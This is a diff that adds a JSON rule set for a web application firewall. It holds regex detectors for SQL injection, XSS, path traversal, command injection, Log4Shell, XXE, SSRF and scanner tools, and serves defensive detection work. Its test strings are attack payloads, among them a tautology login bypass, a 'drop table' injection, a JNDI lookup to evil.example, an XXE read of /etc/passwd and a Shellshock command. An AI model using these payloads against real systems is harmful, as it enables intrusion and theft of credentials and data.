@@ -1,0 +1,419 @@
+{
+  "schema": 1,
+  "name": "zirogate-builtin",
+  "version": "1",
+  "rules": [
+    {
+      "id": "ZW-942100",
+      "group": "sqli",
+      "level": 1,
+      "score": 5,
+      "msg": "SQL injection: UNION SELECT",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["union"],
+      "re": "\\bunion\\b[\\s(]*(?:all[\\s(]+|distinct[\\s(]+)?select\\b",
+      "tests": {"match": ["1 union select 1,2"], "nomatch": ["union station timetable"]}
+    },
+    {
+      "id": "ZW-942110",
+      "group": "sqli",
+      "level": 1,
+      "score": 5,
+      "msg": "SQL injection: quote followed by a boolean tautology",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["' or", "' and", "\" or", "\" and", "'or", "\"or", "'||", "\"||", "'&&", "' ||", "' &&"],
+      "re": "['\"]\\s*(?:or|and|\\|\\||&&)\\s*['\"(]?[\\w.]*['\"]?\\s*(?:=|<>|!=|<|>|like\\b|is\\b|in\\b|between\\b)",
+      "tests": {"match": ["admin' or '1'='1"], "nomatch": ["o'brien and sons"]}
+    },
+    {
+      "id": "ZW-942120",
+      "group": "sqli",
+      "level": 2,
+      "score": 4,
+      "msg": "SQL injection: numeric tautology",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["or 1", "and 1", "or 0", "and 0", "1=1", "1 = 1", "or true", "and true", "or false", "and false", "or '", "and '", "or \"", "and \""],
+      "re": "\\b(?:or|and)\\s+(?:\\d+|true|false|'[^'\\x01]*'|\"[^\"\\x01]*\")\\s*(?:=|<>|!=|like\\b)\\s*(?:\\d+|true|false|'[^'\\x01]*'|\"[^\"\\x01]*\")|\\b1\\s*=\\s*1\\b",
+      "tests": {"match": ["id=1 or 1=1"], "nomatch": ["the mayor 1 of 3"]}
+    },
+    {
+      "id": "ZW-942130",
+      "group": "sqli",
+      "level": 1,
+      "score": 5,
+      "msg": "SQL injection: stacked statement",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["; drop", ";drop", "; select", ";select", "; insert", ";insert", "; update", ";update", "; delete", ";delete", "; exec", ";exec", "; shutdown", ";shutdown", "; truncate", ";truncate", "; alter", ";alter", "; create", ";create", "; declare", ";declare", "; waitfor", ";waitfor"],
+      "re": ";\\s*(?:drop|select|insert|update|delete|exec|execute|shutdown|truncate|alter|create|declare|waitfor)\\b",
+      "tests": {"match": ["x'; drop table users"], "nomatch": ["a; dropdown menu"]}
+    },
+    {
+      "id": "ZW-942140",
+      "group": "sqli",
+      "level": 1,
+      "score": 3,
+      "msg": "SQL injection: comment after a quote",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["'--", "' --", "\"--", "\" --", "'#", "' #", "'/*", "' /*", ")--", ") --", ")#"],
+      "re": "['\"]\\)*\\s*(?:--|#|/\\*)",
+      "tests": {"match": ["admin'--"], "nomatch": ["rock -- roll"]}
+    },
+    {
+      "id": "ZW-942150",
+      "group": "sqli",
+      "level": 1,
+      "score": 5,
+      "msg": "SQL injection: database function or catalog",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["sleep", "benchmark", "waitfor", "load_file", "extractvalue", "updatexml", "xp_cmdshell", "into outfile", "into dumpfile", "information_schema", "sysobjects", "sys.databases", "sys.tables", "mysql.user", "@@version", "group_concat"],
+      "re": "\\b(?:sleep\\s*\\(\\s*\\d+\\s*\\)|pg_sleep\\s*\\(|benchmark\\s*\\(\\s*\\d+\\s*,|waitfor\\s+delay\\s+['\"]|load_file\\s*\\(|extractvalue\\s*\\(|updatexml\\s*\\(|xp_cmdshell|into\\s+(?:out|dump)file)|information_schema\\s*\\.|@@version|\\bsys\\.(?:databases|tables|objects)\\b|\\bmysql\\.user\\b|\\bgroup_concat\\s*\\(",
+      "tests": {"match": ["1 and sleep(5)"], "nomatch": ["a good sleep is vital"]}
+    },
+    {
+      "id": "ZW-942160",
+      "group": "sqli",
+      "level": 3,
+      "score": 3,
+      "msg": "SQL: statement keywords in free text",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["select", "insert into", "delete from", "drop table", "drop database", "update"],
+      "re": "\\bselect\\b[^\\x01]{1,120}?\\bfrom\\b|\\binsert\\s+into\\b|\\bdelete\\s+from\\b|\\bdrop\\s+(?:table|database)\\b|\\bupdate\\b[^\\x01]{1,60}?\\bset\\b",
+      "tests": {"match": ["select name from users"], "nomatch": ["please select an option"]}
+    },
+    {
+      "id": "ZW-942170",
+      "group": "sqli",
+      "level": 2,
+      "score": 4,
+      "msg": "SQL injection: column probing",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["order by", "group by", "having", "limit "],
+      "re": "\\b(?:order|group)\\s+by\\s+\\d+|\\bhaving\\s+\\d+\\s*=|\\blimit\\s+\\d+\\s*,\\s*\\d+\\s*(?:--|#|$)",
+      "tests": {"match": ["1 order by 5"], "nomatch": ["order by tomorrow"]}
+    },
+    {
+      "id": "ZW-942180",
+      "group": "sqli",
+      "level": 2,
+      "score": 3,
+      "msg": "SQL injection: long hex literal",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["0x"],
+      "re": "\\b0x[0-9a-f]{8,}\\b",
+      "tests": {"match": ["x=0x41424344454647"], "nomatch": ["color 0xff"]}
+    },
+    {
+      "id": "ZW-941100",
+      "group": "xss",
+      "level": 1,
+      "score": 5,
+      "msg": "XSS: script tag",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["<script", "</script", "< script"],
+      "re": "<\\s*/?\\s*script\\b",
+      "tests": {"match": ["<script>alert(1)</script>"], "nomatch": ["javascript tutorial"]}
+    },
+    {
+      "id": "ZW-941110",
+      "group": "xss",
+      "level": 1,
+      "score": 5,
+      "msg": "XSS: event handler attribute",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["onerror", "onload", "onclick", "onmouse", "onfocus", "onblur", "onkey", "onsubmit", "onchange", "oninput", "ontoggle", "onstart", "onbegin", "onpageshow", "onanimation", "onpointer", "ondrag", "ondrop", "onwheel", "oncopy", "onpaste", "onresize", "onscroll", "onplay"],
+      "re": "\\bon(?:error|load|click|mouse\\w+|focus\\w*|blur|key\\w+|submit|change|input|toggle|start|begin|pageshow|animation\\w+|pointer\\w+|drag\\w*|drop|wheel|copy|paste|resize|scroll|play)\\s*=",
+      "tests": {"match": ["<img src=x onerror=alert(1)>"], "nomatch": ["the onerous task"]}
+    },
+    {
+      "id": "ZW-941120",
+      "group": "xss",
+      "level": 1,
+      "score": 4,
+      "msg": "XSS: script URI",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["javascript", "vbscript", "data:"],
+      "re": "\\b(?:javascript|vbscript)\\s*:|\\bdata\\s*:\\s*text/html",
+      "tests": {"match": ["javascript:alert(1)"], "nomatch": ["learn javascript basics"]}
+    },
+    {
+      "id": "ZW-941130",
+      "group": "xss",
+      "level": 1,
+      "score": 5,
+      "msg": "XSS: embedding tag",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["<iframe", "<object", "<embed", "<svg", "<math", "<base", "<applet"],
+      "re": "<\\s*(?:iframe|object|embed|svg|math|base|applet)\\b",
+      "tests": {"match": ["<iframe src=//evil.example>"], "nomatch": ["an iframe is an html element"]}
+    },
+    {
+      "id": "ZW-941140",
+      "group": "xss",
+      "level": 2,
+      "score": 4,
+      "msg": "XSS: markup tag",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["<img", "<body", "<link", "<meta", "<style", "<form", "<video", "<audio", "<details", "<marquee", "<input", "<button", "<textarea"],
+      "re": "<\\s*(?:img|body|link|meta|style|form|video|audio|details|marquee|input|button|textarea)\\b[^>\\x01]*>",
+      "tests": {"match": ["<img src=x>"], "nomatch": ["an img tag"]}
+    },
+    {
+      "id": "ZW-941150",
+      "group": "xss",
+      "level": 2,
+      "score": 4,
+      "msg": "XSS: CSS expression or binding",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["expression", "-moz-binding", "@import", "behavior"],
+      "re": "\\bexpression\\s*\\(|-moz-binding|@import\\s+(?:url|[\"'])|\\bbehavior\\s*:\\s*url",
+      "tests": {"match": ["width: expression(alert(1))"], "nomatch": ["an expression of joy"]}
+    },
+    {
+      "id": "ZW-941160",
+      "group": "xss",
+      "level": 2,
+      "score": 4,
+      "msg": "XSS: script sink",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["document.", "window.", "eval", "alert", "prompt", "confirm", "fromcharcode"],
+      "re": "\\bdocument\\s*\\.\\s*(?:cookie|write|domain|location)|\\bwindow\\s*\\.\\s*(?:location|name)|\\beval\\s*\\(|\\balert\\s*\\(|\\bprompt\\s*\\(|\\bconfirm\\s*\\(|fromcharcode",
+      "tests": {"match": ["document.cookie"], "nomatch": ["alert me later"]}
+    },
+    {
+      "id": "ZW-930100",
+      "group": "lfi",
+      "level": 1,
+      "score": 5,
+      "msg": "Path traversal",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["../", "..\\", "..;/"],
+      "re": "(?:^|[/\\\\\\x01])\\.\\.(?:[/\\\\;]|$|\\x01)",
+      "tests": {"match": ["../../etc"], "nomatch": ["see file../notes"]}
+    },
+    {
+      "id": "ZW-930110",
+      "group": "lfi",
+      "level": 1,
+      "score": 5,
+      "msg": "Access to a sensitive file",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["/etc/", "/proc/", "boot.ini", "win.ini", "/windows/system32", "/.env", ".git/", "/.ssh/", "id_rsa", ".htpasswd", "wp-config.php", "web-inf/", ".aws/credentials"],
+      "re": "/etc/(?:passwd|shadow|group|hosts|issue|sudoers)|/proc/(?:self|\\d+|version|cmdline)|\\bboot\\.ini\\b|\\bwin\\.ini\\b|/windows/system32|(?:^|/)\\.env(?:\\.|$|\\x01)|\\.git/(?:config|head)|/\\.ssh/|\\bid_rsa\\b|\\.htpasswd|wp-config\\.php|web-inf/|\\.aws/credentials",
+      "tests": {"match": ["/etc/passwd"], "nomatch": ["/etc/ is a directory name"]}
+    },
+    {
+      "id": "ZW-930120",
+      "group": "lfi",
+      "level": 1,
+      "score": 5,
+      "msg": "Stream wrapper",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["php://", "file://", "expect://", "zip://", "phar://", "glob://", "compress.zlib://", "ssh2://", "ogg://", "rar://"],
+      "re": "\\b(?:php|file|expect|zip|phar|glob|compress\\.zlib|rar|ogg|ssh2)://",
+      "tests": {"match": ["php://filter/resource=x"], "nomatch": ["see http://example.com"]}
+    },
+    {
+      "id": "ZW-932100",
+      "group": "rce",
+      "level": 1,
+      "score": 5,
+      "msg": "Command injection: shell command after a separator",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": [";", "|", "&&", "`", "$("],
+      "re": "(?:;|\\|\\|?|&&|`|\\$\\()\\s*(?:cat|ls|id|whoami|uname|wget|curl|nc|ncat|netcat|bash|sh|zsh|python[23]?|perl|ruby|php|node|rm|chmod|chown|ping|nslookup|dig|echo|sleep|env|printenv|nmap|telnet|ftp|tftp|powershell|cmd)\\b(?:\\s|$|\\x01|[;|&`)<>-])",
+      "tests": {"match": ["x; cat /etc/passwd"], "nomatch": ["tea; category list"]}
+    },
+    {
+      "id": "ZW-932110",
+      "group": "rce",
+      "level": 1,
+      "score": 5,
+      "msg": "Command injection: shell or interpreter path",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["/bin/", "/usr/bin/", "cmd.exe", "cmd /c", "powershell", "/dev/tcp/", "/dev/udp/"],
+      "re": "/bin/(?:ba|z|da|k|c|tc)?sh\\b|/usr/bin/(?:env|python[23]?|perl|ruby|php|wget|curl|nc|ncat|bash)\\b|\\bcmd(?:\\.exe)?\\s*/c\\b|\\bpowershell(?:\\.exe)?\\s+-|/dev/(?:tcp|udp)/",
+      "tests": {"match": ["/bin/bash -c id"], "nomatch": ["the /bin/ directory"]}
+    },
+    {
+      "id": "ZW-932120",
+      "group": "rce",
+      "level": 1,
+      "score": 5,
+      "msg": "Code injection: PHP open tag",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["<?"],
+      "re": "<\\?(?:php|=)",
+      "tests": {"match": ["<?php echo 1 ?>"], "nomatch": ["what is <? in xml"]}
+    },
+    {
+      "id": "ZW-932130",
+      "group": "rce",
+      "level": 2,
+      "score": 4,
+      "msg": "Code injection: dangerous function call",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["eval", "assert", "system", "passthru", "shell_exec", "popen", "proc_open", "pcntl_exec", "base64_decode", "create_function", "exec", "os.system", "os.popen", "subprocess", "child_process", "__import__", "runtime"],
+      "re": "\\b(?:eval|assert|system|passthru|shell_exec|popen|proc_open|pcntl_exec|create_function|base64_decode|exec)\\s*\\(|\\bos\\.(?:system|popen)\\b|\\bsubprocess\\.|\\bchild_process\\b|__import__\\s*\\(|\\bruntime\\s*\\.\\s*(?:getruntime\\(\\)\\s*\\.\\s*)?exec",
+      "tests": {"match": ["eval(base64_decode(x))"], "nomatch": ["evaluate the results"]}
+    },
+    {
+      "id": "ZW-932140",
+      "group": "rce",
+      "level": 3,
+      "score": 3,
+      "msg": "Template injection",
+      "targets": ["path", "args", "cookies", "body"],
+      "needles": ["{{", "${", "<%", "#{"],
+      "re": "\\{\\{[^\\x01]{1,80}?\\}\\}|\\$\\{[^}\\x01]{1,80}\\}|<%[=-]?[^\\x01]{1,80}?%>|#\\{[^}\\x01]{1,80}\\}",
+      "tests": {"match": ["{{7*7}}"], "nomatch": ["a { b } c"]}
+    },
+    {
+      "id": "ZW-932150",
+      "group": "rce",
+      "level": 1,
+      "score": 5,
+      "msg": "Shellshock",
+      "targets": ["cookies", "headers"],
+      "needles": ["() {", "(){"],
+      "re": "\\(\\)\\s*\\{",
+      "tests": {"match": ["() { :;}; /bin/id"], "nomatch": ["fn() and block"]}
+    },
+    {
+      "id": "ZW-944100",
+      "group": "java",
+      "level": 1,
+      "score": 5,
+      "msg": "Log4Shell / JNDI lookup",
+      "targets": ["path", "args", "cookies", "headers", "body"],
+      "needles": ["${", "jndi:"],
+      "re": "\\$\\{\\s*(?:jndi|\\$\\{|lower:|upper:|::-|env:|sys:|java:|ctx:|date:|bundle:|main:|k8s:|docker:|spring:|web:|base64:)|jndi\\s*:\\s*(?:ldaps?|rmi|dns|iiop|nis|corba|https?)",
+      "tests": {"match": ["${jndi:ldap://evil.example/a}"], "nomatch": ["price is ${amount}"]}
+    },
+    {
+      "id": "ZW-944110",
+      "group": "java",
+      "level": 1,
+      "score": 5,
+      "msg": "Java class loading, OGNL or serialized object",
+      "targets": ["path", "args", "cookies", "headers", "body"],
+      "needles": ["java.", "classloader", "runtime", "processbuilder", "(#", "%{", "@java", "ro0ab", "aced0005"],
+      "re": "\\bjava\\.lang\\.(?:runtime|processbuilder|system|class)\\b|\\bjava\\.io\\.(?:objectinputstream|filereader|file)\\b|class\\.(?:module\\.)?classloader|\\bruntime\\s*\\.\\s*getruntime|\\bprocessbuilder\\s*\\(|\\(#[a-z_]\\w*\\s*=|%\\{#|@java\\.|\\bro0ab[a-z0-9+/]{6}|\\baced0005",
+      "tests": {"match": ["java.lang.runtime.getruntime()"], "nomatch": ["java.lang.string docs"]}
+    },
+    {
+      "id": "ZW-946100",
+      "group": "xxe",
+      "level": 1,
+      "score": 5,
+      "msg": "XML external entity or DTD",
+      "targets": ["args", "body"],
+      "needles": ["<!entity", "<!doctype", "xi:include"],
+      "re": "<!entity\\b|<!doctype[^>\\x01]*\\[|<xi:include\\b",
+      "tests": {"match": ["<!doctype foo [<!entity x system \"file:///etc/passwd\">]>"], "nomatch": ["<!doctype html>"]}
+    },
+    {
+      "id": "ZW-934100",
+      "group": "ssrf",
+      "level": 1,
+      "score": 5,
+      "msg": "Cloud metadata endpoint",
+      "targets": ["path", "args", "cookies", "headers", "body"],
+      "needles": ["169.254.", "metadata.google.internal", "100.100.100.200", "fd00:ec2", "metadata.azure", "instance-data"],
+      "re": "169\\.254\\.(?:169\\.254|170\\.2)|metadata\\.google\\.internal|100\\.100\\.100\\.200|fd00:ec2::254|metadata\\.azure\\.com|\\binstance-data\\b",
+      "tests": {"match": ["http://169.254.169.254/latest"], "nomatch": ["version 169.254.1.1"]}
+    },
+    {
+      "id": "ZW-934110",
+      "group": "ssrf",
+      "level": 1,
+      "score": 4,
+      "msg": "Dangerous URL scheme",
+      "targets": ["path", "args", "body"],
+      "needles": ["gopher://", "dict://", "ldap://", "ldaps://", "tftp://", "jar:", "netdoc://", "sftp://", "smb://"],
+      "re": "\\b(?:gopher|dict|ldaps?|tftp|jar|netdoc|sftp|smb)://|\\bjar:(?:https?|file)",
+      "tests": {"match": ["gopher://127.0.0.1:6379/_"], "nomatch": ["see https://example.com"]}
+    },
+    {
+      "id": "ZW-934120",
+      "group": "ssrf",
+      "level": 2,
+      "score": 4,
+      "msg": "URL pointing at an internal address",
+      "targets": ["path", "args", "body"],
+      "needles": ["://localhost", "://127.", "://0.0.0.0", "://[::", "://10.", "://192.168.", "://172.", "://0x7f", "://2130706433", "://0177", "@localhost", "@127."],
+      "re": "(?:https?|ftp)://(?:[^/@\\x01]*@)?(?:localhost\\b|127\\.\\d+\\.\\d+\\.\\d+|0\\.0\\.0\\.0|0x7f[0-9a-f]*|2130706433|0177\\.|\\[::1?\\]|10\\.\\d+\\.\\d+\\.\\d+|192\\.168\\.\\d+\\.\\d+|172\\.(?:1[6-9]|2\\d|3[01])\\.\\d+\\.\\d+)",
+      "tests": {"match": ["url=http://192.168.1.10/admin"], "nomatch": ["https://example.com/a"]}
+    },
+    {
+      "id": "ZW-913100",
+      "group": "scanner",
+      "level": 1,
+      "score": 5,
+      "msg": "Known scanner or attack tool",
+      "targets": ["ua"],
+      "needles": ["sqlmap", "nikto", "nessus", "acunetix", "nmap", "masscan", "wpscan", "dirbuster", "gobuster", "ffuf", "wfuzz", "havij", "netsparker", "burpcollaborator", "zgrab", "nuclei", "openvas", "w3af", "arachni", "metasploit", "hydra", "jaeles", "feroxbuster", "commix", "xsser", "skipfish", "whatweb", "appscan", "webinspect", "zaproxy", "owasp zap", "bsqlbf", "pangolin"],
+      "re": "sqlmap|nikto|nessus|acunetix|nmap|masscan|wpscan|dirbuster|gobuster|\\bffuf\\b|wfuzz|havij|netsparker|burpcollaborator|zgrab|nuclei|openvas|w3af|arachni|metasploit|\\bhydra\\b|jaeles|feroxbuster|commix|xsser|skipfish|whatweb|appscan|webinspect|zaproxy|owasp zap|bsqlbf|pangolin",
+      "tests": {"match": ["sqlmap/1.7.2#stable"], "nomatch": ["mozilla/5.0 firefox"]}
+    },
+    {
+      "id": "ZW-913110",
+      "group": "scanner",
+      "level": 2,
+      "score": 4,
+      "msg": "Probe for a common sensitive path",
+      "targets": ["path"],
+      "needles": ["/.env", "/.git/", "/.svn/", "/.hg/", "wp-login", "wp-admin", "xmlrpc.php", "phpmyadmin", "/.aws/", ".ds_store", "server-status", "/actuator/", "cgi-bin/", ".htaccess", "phpinfo", "vendor/phpunit", "solr/admin", "manager/html", "jmx-console"],
+      "re": "/(?:\\.env|\\.git/|\\.svn/|\\.hg/|wp-login\\.php|wp-admin/|xmlrpc\\.php|phpmyadmin|\\.aws/|\\.ds_store|server-status|actuator/(?:env|heapdump|threaddump|mappings|beans)|cgi-bin/|\\.htaccess|phpinfo|vendor/phpunit|solr/admin|manager/html|jmx-console)",
+      "tests": {"match": ["/wp-login.php"], "nomatch": ["/wp-content/uploads"]}
+    },
+    {
+      "id": "ZW-920100",
+      "group": "protocol",
+      "level": 1,
+      "score": 5,
+      "msg": "Unknown request method"
+    },
+    {
+      "id": "ZW-920110",
+      "group": "protocol",
+      "level": 1,
+      "score": 4,
+      "msg": "TRACE or TRACK request"
+    },
+    {
+      "id": "ZW-920120",
+      "group": "protocol",
+      "level": 2,
+      "score": 3,
+      "msg": "Unusually many request headers"
+    },
+    {
+      "id": "ZW-920130",
+      "group": "protocol",
+      "level": 1,
+      "score": 4,
+      "msg": "Request URI longer than 8 KB"
+    },
+    {
+      "id": "ZW-920170",
+      "group": "protocol",
+      "level": 1,
+      "score": 4,
+      "msg": "NUL byte in the request"
+    },
+    {
+      "id": "ZW-920190",
+      "group": "protocol",
+      "level": 1,
+      "score": 4,
+      "msg": "Range header with many ranges"
+    },
+    {
+      "id": "ZW-920200",
+      "group": "protocol",
+      "level": 1,
+      "score": 5,
+      "msg": "Proxy request header (httpoxy)"
+    }
+  ]
+}
